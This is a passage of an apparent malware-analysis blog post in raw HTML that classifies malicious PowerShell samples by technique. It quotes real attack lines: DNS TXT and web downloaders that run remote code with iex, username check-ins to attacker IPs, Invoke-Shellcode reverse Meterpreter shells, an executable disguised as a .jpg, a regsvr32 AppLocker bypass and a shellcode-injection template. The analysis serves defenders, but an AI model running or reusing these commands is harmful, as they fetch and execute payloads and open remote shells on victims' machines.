			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Non-authoritative answer:
p.s.os.ns.rankingplac.pl	text = "@$str=''\;$i=1\;while(1){if(''+(nslookup -q=txt \"l.$i.ns.rankingplac[.]pl.\") -match '@(.*)@'){$str += [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))} else {break\;}$i++}iex $str@"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c96a127421221-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c96a127421221-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c96a127421221-1"><span class="crayon-v">Non</span><span class="crayon-o">-</span><span class="crayon-e">authoritative </span><span class="crayon-v">answer</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c96a127421221-2"><span class="crayon-v">p</span><span class="crayon-sy">.</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">os</span><span class="crayon-sy">.</span><span class="crayon-v">ns</span><span class="crayon-sy">.</span><span class="crayon-v">rankingplac</span><span class="crayon-sy">.</span><span class="crayon-e">pl	</span><span class="crayon-v">text</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"@$str=''\;$i=1\;while(1){if(''+(nslookup -q=txt \"l.$i.ns.rankingplac[.]pl.\") -match '@(.*)@'){$str += [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))} else {break\;}$i++}iex $str@"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>This allows the attacker to establish a command and control channel when they are ready to interact with the compromised system.</p>
<p>John Lambert over at Microsoft recently <a href="https://twitter.com/JohnLaTwC/status/831963320915685377">tweeted</a> about this variant and identified it as being used during penetration testing. Another example of the technique can be found in the <a href="https://github.com/samratashok/nishang">Nishang</a> framework for penetration testing.</p>
<p><strong>Downloader Proxy (9 Samples – 0.22% Coverage)</strong></p>
<p>This variant will explicitly use the configured proxy and credentials for the user running the PowerShell command. Of note for this one is the passing of the username as a value to the “u” parameter in the web request. This is a common “check-in” activity so the attacker knows whom they have infected; it can be used to further handle how subsequent interactions take place (e.g. block further connections if known sandbox username).</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c96b209704899" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$x=$Env:username;$u="http://54.213.195[.]138/s2.txt?u=" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c96b209704899-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c96b209704899-1"><span class="crayon-sy">$</span><span class="crayon-v">x</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">Env</span><span class="crayon-o">:</span><span class="crayon-v">username</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">u</span><span class="crayon-o">=</span><span class="crayon-s">"http://54.213.195[.]138/s2.txt?u="</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">x</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">p</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebRequest</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">GetSystemWebProxy</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">p</span><span class="crayon-sy">.</span><span class="crayon-v">Credentials</span><span class="crayon-o">=</span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">CredentialCache</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">DefaultCredentials</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-o">=</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">net</span><span class="crayon-sy">.</span><span class="crayon-v">webclient</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-sy">.</span><span class="crayon-v">proxy</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">p</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-sy">.</span><span class="crayon-v">UseDefaultCredentials</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-t">true</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadString</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">u</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-v">Invoke</span><span class="crayon-o">-</span><span class="crayon-v">Expression</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Command</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">s</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p></p>
<h3>Meterpreter RHTTP (6 Samples – 0.15% Coverage)</h3>
<p>This next technique simply pulls down the Invoke-Shellcode script used in tools such as PowerShell Empire and PowerSploit, and then calls the function to generate a reverse HTTPS Meterpreter shell.</p>
<p>All but one of the samples pulled code from GitHub, either directly through the official repository or through a forked version.</p>
<p>GitHub –</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c96f371977987" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1"); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 88.160.254[.]183 -Lport 8080 -Force</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c96f371977987-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c96f371977987-1"><span class="crayon-e">iex</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadString</span><span class="crayon-sy">(</span><span class="crayon-s">"https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">Invoke</span><span class="crayon-o">-</span><span class="crayon-v">Shellcode</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Payload </span><span class="crayon-v">windows</span><span class="crayon-o">/</span><span class="crayon-v">meterpreter</span><span class="crayon-o">/</span><span class="crayon-v">reverse_http</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Lhost</span><span class="crayon-h"> </span><span class="crayon-cn">88.160.254</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-cn">183</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Lport</span><span class="crayon-h"> </span><span class="crayon-cn">8080</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">Force</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>Non-GitHub –</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c970727478745" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
IEX (New-Object Net.WebClient).DownloadString('http://el8[.]pw/ps/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 65.112.221[.]34 -Lport 443 –Force</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c970727478745-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c970727478745-1"><span class="crayon-e">IEX</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadString</span><span class="crayon-sy">(</span><span class="crayon-s">'http://el8[.]pw/ps/CodeExecution/Invoke-Shellcode.ps1'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">Invoke</span><span class="crayon-o">-</span><span class="crayon-v">Shellcode</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Payload </span><span class="crayon-v">windows</span><span class="crayon-o">/</span><span class="crayon-v">meterpreter</span><span class="crayon-o">/</span><span class="crayon-v">reverse_https</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Lhost</span><span class="crayon-h"> </span><span class="crayon-cn">65.112.221</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-cn">34</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Lport</span><span class="crayon-h"> </span><span class="crayon-cn">443</span><span class="crayon-h"> </span>–<span class="crayon-v">Force</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><strong>Downloader Kraken (5 Samples – 0.12% Coverage)</strong></p>
<p>I called this one “Kraken” simply because of the filename of the executable it downloads, (“Kraken.jpg”), but it uses a similar download technique as seen in Downloader DFSP. One difference is that instead of using the “$env” variable directly, it uses System.IO.Path to retrieve the path for the $TEMP directory.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c971839165239" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$TempDir = [System.IO.Path]::GetTempPath(); (New-Object System.Net.WebClient).DownloadFile("http://kulup.isikun.edu.tr/Kraken.jpg","  $TempDir\syshost.exe"); start $TempDir\syshost.exe;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c971839165239-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c971839165239-1"><span class="crayon-sy">$</span><span class="crayon-v">TempDir</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">IO</span><span class="crayon-sy">.</span><span class="crayon-v">Path</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">GetTempPath</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-s">"http://kulup.isikun.edu.tr/Kraken.jpg"</span><span class="crayon-sy">,</span><span class="crayon-s">"&nbsp;&nbsp;$TempDir\syshost.exe"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">start</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">TempDir</span><span class="crayon-sy">\</span><span class="crayon-v">syshost</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><strong>AppLocker Bypass (4 Samples – 0.12% Coverage)</strong></p>
<p>This next technique uses PowerShell to run the regsvr32 tool to bypass Microsoft Windows AppLocker. This technique was <a href="http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html">found</a> by Casey Smith (<a href="https://twitter.com/subTee">@subTee</a>) and abuses the fact that scripts are executed when unregistering a COM object via regsvr32.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c972874321178" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
regsvr32 /u /s /i:http://&amp;lt;IP_REDACTED&amp;gt;/test.jpg scrobj.dll</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c972874321178-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c972874321178-1"><span class="crayon-v">regsvr32</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">u</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">i</span><span class="crayon-o">:</span><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//&amp;lt;IP_REDACTED&amp;gt;/test.jpg scrobj.dll</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>Embedded Payloads</strong></p>
<p>PowerShell code identified with the primary intention of launching embedded payloads, such as shellcode.</p>
<p><strong>Shellcode Inject (1,147 Samples – 27.98% Coverage),</strong></p>
<p><strong>Unicorn (611 Samples – 14.90% Coverage),</strong></p>
<p><strong>SET (199 Samples – 4.85% Coverage),</strong></p>
<p><strong>Unicorn Modified (14 Samples – 0.34% Coverage)</strong></p>
<p>As I already showed examples of SET and Magic Unicorn’s implementation of the Shellcode Injection technique, I’ve decided to just lump all of the variants together using this shellcode injection template. Below is a sample from the “Shellcode Inject” variant, which is a copy of Matt Graeber’s original post, and you’ll immediately see the similarities with the SET and Magic Unicorn code.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c973650021235" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,&amp;lt;SHELLCODE&amp;gt;,0x19;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c973650021235-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c973650021235-1"><span class="crayon-sy">$</span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">w</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">Add</span><span class="crayon-o">-</span><span class="crayon-v">Type</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">memberDefinition</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Name</span><span class="crayon-h"> </span><span class="crayon-s">"Win32"</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-t">namespace</span><span class="crayon-h"> </span><span class="crayon-v">Win32Functions</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">passthru</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-t">Byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-sy">[</span><span class="crayon-t">Byte</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-sy">$</span><span class="crayon-v">z</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0xbf</span><span class="crayon-sy">,</span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">SHELLCODE</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-sy">,</span><span class="crayon-cn">0x19</span><span class="crayon-sy">;</span><span class="crayon-sy">$</span><span class="crayon-v">g</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x1000</span><span class="crayon-sy">;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">z</span><span class="crayon-sy">.</span><span class="crayon-v">Length</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">gt</span><span class="crayon-h"> </span><span class="crayon-cn">0x1000</span><span class="crayon-sy">)</span><span 